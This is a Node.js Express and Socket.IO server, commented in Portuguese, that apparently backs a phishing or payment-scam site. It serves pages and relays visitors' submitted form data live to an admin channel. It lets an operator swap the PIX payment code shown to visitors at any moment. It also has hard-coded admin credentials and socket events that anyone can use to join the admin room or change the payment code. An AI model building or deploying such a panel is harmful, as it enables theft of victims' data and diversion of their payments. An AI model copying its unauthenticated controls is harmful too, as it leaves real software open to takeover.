const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const session = require('express-session');
const fs = require('fs');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Configuração da sessão
app.use(session({
    secret: 'sua_chave_secreta_aqui',
    resave: false,
    saveUninitialized: true
}));

const server = http.createServer(app);
const io = socketIo(server);

const PORT = process.env.PORT || 3000;

// Arquivo para armazenar o código PIX
const PIX_FILE = path.join(__dirname, 'pixcode.txt');

// Função para ler o código PIX do arquivo
function readPixCode() {
    try {
        return fs.readFileSync(PIX_FILE, 'utf8').trim();
    } catch (error) {
        console.error('Erro ao ler o código PIX:', error);
        return '';
    }
}

// Função para escrever o código PIX no arquivo
function writePixCode(code) {
    try {
        fs.writeFileSync(PIX_FILE, code);
    } catch (error) {
        console.error('Erro ao escrever o código PIX:', error);
    }
}

// Inicializar o código PIX
let pixCode = readPixCode();

// Middleware de autenticação
function requireAuth(req, res, next) {
    if (req.session.authenticated) {
        next();
    } else {
        res.redirect('/admin-login');
    }
}

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Serve home page
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "home.html"));
});

// Serve admin login page
app.get('/admin-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

// Handle admin login
app.post('/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'senha123') {
        req.session.authenticated = true;
        res.redirect('/admin');
    } else {
        res.send('Login falhou. <a href="/admin-login">Tente novamente</a>');
    }
});

// Serve admin page (protected)
app.get('/admin', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve other HTML pages
app.get("/:page", (req, res) => {
    const page = req.params.page;
    res.sendFile(path.join(__dirname, "public", `${page}.html`));
});

// API endpoint para obter o código PIX atual
app.get('/api/pixcode', (req, res) => {
    res.json({ pixCode });
});

// API endpoint para gerar código PIX (simulado)
app.post('/api/get_pix_code', (req, res) => {
    res.json({ pix_code: pixCode || 'PIX_CODE_PADRAO' });
});

// Store connected clients
const clients = new Map();

// Middleware para logar todas as requisições e seus dados
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const sessionId = req.headers['x-session-id'] || 'unknown';
    const logData = {
        sessionId,
        timestamp,
        method: req.method,
        url: req.url,
        data: req.method === 'POST' ? req.body : null
    };
    
    console.log('Request:', logData);
    
    io.to('admin').emit('userAction', {
        sessionId,
        timestamp,
        page: req.url,
        action: req.method,
        data: req.method === 'POST' ? req.body : null
    });
    
    next();
});

io.on('connection', (socket) => {
    console.log('New client connected');
    updateUserCount();

    socket.on('joinAdmin', () => {
        socket.join('admin');
        console.log('Admin joined');
    });

    socket.on('updatePixCode', (newPixCode) => {
        pixCode = newPixCode;
        writePixCode(pixCode);  // Persistir o novo código PIX
        io.emit('pixCodeUpdated', pixCode);
        console.log('PIX code updated:', pixCode);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected');
        updateUserCount();
    });
});

function updateUserCount() {
    const count = io.engine.clientsCount;
    io.to('admin').emit('userCount', count);
}

server.listen(PORT, () => console.log(`Server running on port ${PORT}`));